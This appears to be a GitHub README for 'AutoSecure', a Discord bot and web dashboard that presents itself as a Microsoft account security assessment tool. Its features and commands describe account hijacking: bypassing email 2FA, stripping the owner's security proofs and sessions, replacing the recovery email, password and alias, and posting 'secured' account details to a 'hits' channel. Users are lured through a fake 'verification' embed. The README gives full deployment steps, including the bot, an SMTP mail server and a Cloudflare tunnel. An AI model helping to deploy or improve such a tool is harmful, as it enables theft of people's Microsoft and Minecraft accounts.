# AutoSecure

[![Discord](https://img.shields.io/badge/Join%20Our%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/HAtMcWJrBU)

**A fully request-based Microsoft account security assessment tool for Discord.** No Selenium. No Playwright. AutoSecure automates the entire process of securing Microsoft accounts, retrieving account details, bypassing 2FA, and verifying Minecraft ownership through a Discord bot with a web dashboard.

---

## Table of Contents

- [Features](#features)
- [Quick Setup](#quick-setup)
- [Requirements](#requirements)
- [Discord Bot Setup](#discord-bot-setup)
- [API Keys](#api-keys)
- [Configuration](#configuration)
- [Domain & Tunnel Setup](#domain--tunnel-setup)
- [Running the Bot](#running-the-bot)
- [Web Dashboard](#web-dashboard)
- [Bot Commands](#bot-commands)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)

---

## Features

- Retrieve account owner details (name, country, birth date, language)
- Remove all security proofs (emails, phone numbers, authenticator apps)
- Sign out all active devices and sessions
- Bypass email-based 2FA verification
- Remove Windows Hello keys (Zyger exploit)
- Check if an account is locked
- Disable and re-enable 2FA
- Add Authenticator with TOTP secret
- Generate and replace recovery codes
- Replace primary alias
- Change security email and password
- Delete aliases and third-party services
- Minecraft account checker (ownership, username, name change availability, purchase method, capes, SSID)
- DonutSMP and Hypixel stats checker
- Custom domain for security emails with built-in SMTP server
- Web dashboard (stats, account viewer, manual securing, email inbox, share links)
- Editable embeds, button customization, command aliases

---

## Requirements

| Dependency | Version | Purpose |
|---|---|---|
| Python | 3.14 | Bot, API, securing logic |
| Node.js | LTS | Frontend build (TanStack Start + Vite) |

---

## Quick Setup

> **Important** — This project requires Python 3.14 and Node.js. Port 25 must be open on your server for the SMTP mail server.

```bash
git clone https://github.com/saldevsautosec/autosecure
cd autosecure

pip install -r requirements.txt
cd web && npm install
cd ..

# Linux
sudo start.sh
# Windows
powerhsell
start.ps1

```

---

## Discord Bot Setup

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications)
2. Create a new application → **Bot**
3. Enable **all Privileged Gateway Intents** (Presence, Server Members, Message Content)
4. Copy your bot token
5. Go to **OAuth2 → URL Generator**:
   - Select scopes: `bot`, `applications.commands`
   - Select permissions: `Administrator`
   - Open the generated URL and invite the bot to your server

---

## API Keys

*Optional — required only for Minecraft stats features.*

| Service | URL |
|---|---|
| Skytools | [developer.skytools.app](https://developer.skytools.app/) |
| DonutSMP | [api.donutsmp.net](https://api.donutsmp.net/index.html) |

---

## Configuration

Two config files control the entire project. Both are required.

### `config/config.json`

```json
{
    "owners": [ YOUR_DISCORD_ID ],
    "tokens": {
        "bot_token": "YOUR_BOT_TOKEN",
        "skytools_key": "YOUR_SKYTOOLS_KEY",
        "donut_key": "YOUR_DONUT_KEY"
    },
    "discord": {
        "logs_channel": "",
        "accounts_channel": "",
        "censored_logs_channel": ""
    },
    "autosecure": {
        "replace_main_alias": true,
        "enable_2fa": true,
        "minecon_mode": false
    },
    "web": {
        "credentials": {
            "username": "<YOUR_USERNAME>",
            "password": "<YOUR_PASSWORD>",
            "jwt_secret": "",
            "totp_secret": ""
        }
    },
    "domain": "yourdomain.com"
}
```

| Key | Description |
|---|---|
| `owners` | Discord user IDs with full bot access |
| `tokens.bot_token` | Discord bot token |
| `tokens.skytools_key` | Skytools API key (optional) |
| `tokens.donut_key` | DonutSMP API key (optional) |
| `discord.logs_channel` | Channel ID where verification logs are sent (use `/set channel`) |
| `discord.accounts_channel` | Channel ID where secured account details are posted (use `/set channel`) |
| `discord.censored_logs_channel` | Channel ID for censored logs |
| `autosecure.replace_main_alias` | Replace the main email alias with a random Outlook one |
| `autosecure.enable_2fa` | Adds a Authenticator and enables 2FA |
| `autosecure.minecon_mode` | Disables 2FA and Generates a recovery code only|
| `web.credentials` | Dashboard login credentials |
| `domain` | Your custom domain for security emails |

### `config/bot.json`

Changes bots behaviour: enabled/disabled commands, slash command aliases, fake commands, embed templates, button text and color, presence, post-verification actions.

---

## Domain & Tunnel Setup

The bot runs a built-in SMTP server on port 25 to receive verification emails. You need a domain with port 25 open and a Cloudflare tunnel.

### DNS Records

Add these records in Cloudflare, proxy status to DNS Only:

| Type | Name | Value |
|---|---|---|
| A | `mail` | Your server's public IP |
| MX | `@` | Your domain (e.g. `mail.yourdomain`), priority `10` |

### Cloudflare Tunnel

1. Install `cloudflared`: [download](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)

2. Create a tunnel:

```bash
cloudflared tunnel login
cloudflared tunnel create autosecure
cloudflared tunnel route dns autosecure yourdomain.com
```

3. Edit `cloudflared.yml`:

```yaml
tunnel: autosecure
credentials-file: /home/user/.cloudflared/<tunnel-id>.json
ingress:
  - hostname: yourdomain.com
    path: /api/*
    service: http://localhost:8000
  - hostname: yourdomain.com
    service: http://localhost:3000
  - service: http_status:404
```

---

## Running the Bot

### Everything (Bot + API + Frontend + Tunnel)

```bash
sudo start.sh
```

Or if you're using Windows

```bash
powerhsell 
start.ps1
```

This builds the frontend, starts FastAPI (port 8000), the Nitro frontend server (port 3000), the Cloudflare tunnel, and the Discord bot.

### Bot Only

```bash
python bot.py
```

---

## Web Dashboard

Access the dashboard at `https://yourdomain.com`. Login with the credentials from `config.json`.

| Tab | Description |
|---|---|
| Overview | Total accounts, Minecraft accounts, daily/montly stats |
| Accounts | Browse, search, and view secured accounts with full details |
| Secure | Manually secure accounts (single or bulk) via the dashboard |
| Bot Config | Servers, command management, embed templates, channels, autosecure toggles |
| Settings | Change password, configure 2FA for the dashboard |
| Emails | Manage security email addresses and view inboxes |

---

## Bot Commands

> **Tip** — All command names can be changed via web.

| Command | Description |
|---|---|
| `/secure` | Automatically secure a Microsoft account |
| `/check locked` | Check if an account is locked |
| `/auth code` | Generate a TOTP code from a 2FA secret |
| `/request_otp` | Request a one-time password (2FA bypass) |
| `/email new` | Register a new security email |
| `/email inbox` | View the inbox of a security email |
| `/email list` | List all stored security emails |
| `/set channel` | Set the logs, censored logs, or hits channel |
| `/send embed` | Send the verification embed |
| `/stats donut` | Check DonutSMP stats |
| `/stats hypixel` | Check Hypixel stats |

---

## Troubleshooting

| Problem | Solution |
|---|---|
| Bot fails to start | Check your bot token in `config.json` and that all Intents are enabled |
| Emails not being received | Check that port 25 is open and you setup all your domain records |
| Dashboard login fails | Verify your `web.credentials` in `config.json` |
| Command names not updating | Bot restart is required after changing aliases in `bot.json` and discord takes time syncing commands |
| 403 Missing Access errors | The bot doesn't have permission to view/send to the configured channel — check channel IDs |

---

## Disclaimer

Use at your own risk.  
Automation of Microsoft services may violate their Terms of Service and lead to account suspension or bans.  
This software is provided for educational purposes only.  
The authors are not responsible for any actions taken by Microsoft.
